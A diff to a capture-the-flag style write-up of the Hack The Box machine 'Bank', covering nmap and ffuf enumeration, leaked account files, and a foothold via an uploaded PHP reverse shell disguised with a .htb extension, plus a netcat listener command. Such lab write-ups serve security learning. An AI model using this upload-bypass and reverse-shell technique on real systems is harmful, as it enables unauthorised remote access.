@@ -1,6 +1,6 @@
 Target: 10.10.10.29
 
-## Enumeration
+## Enumeration:
 
 nmap
 ```
@@ -27,6 +27,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 checking 10.10.10.29
+
 ![index.html]()
 
 adding dns to /etc/hosts
@@ -35,6 +36,7 @@ adding dns to /etc/hosts
 ```
 
 checking bank.htb
+
 ![bank.htb](bank2.png)
 
 ffuf
@@ -49,6 +51,7 @@ balance-transfer        [Status: 301, Size: 314, Words: 20, Lines: 10]
 ```
 
 checking /balance-transfer
+
 ![/balance-transfer](bank3.png)
 
 
@@ -71,6 +74,7 @@ Balance: 905948 .
 ```
 
 looking 
+
 ![/weird file](bank4.png)
 
 ```
@@ -91,26 +95,29 @@ Balance: 8842803 .
 ```
 
 accessing website using found account
+
 ![logged in](bank5.png)
 
 checking support.php
+
 ![support](bank6.png)
 
 inspecting support.php
+
 ![inspect](bank7.png)
 
 
 ### Findings:Looking for attack vectors
 
 
-essay of thought process
+Upload a php reverse shell with a file extention of .htb to have RCE.
 
 
 ## Foothold:
 
 [Payload Link](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
 
-preparing the payload > rename to trustme.thb
+preparing the payload > rename to trustme.htb
 ```
 <snip>
 $ip = '<ip>';  		// CHANGE THIS
@@ -123,7 +130,8 @@ opening a nc listener on port 9001
 $ nc -lnvp 9001
 ```
 
-accessing uploaded trustme.thb
+accessing uploaded trustme.htb
+
 ![trustme.thb](bank8.png)
 
 ```
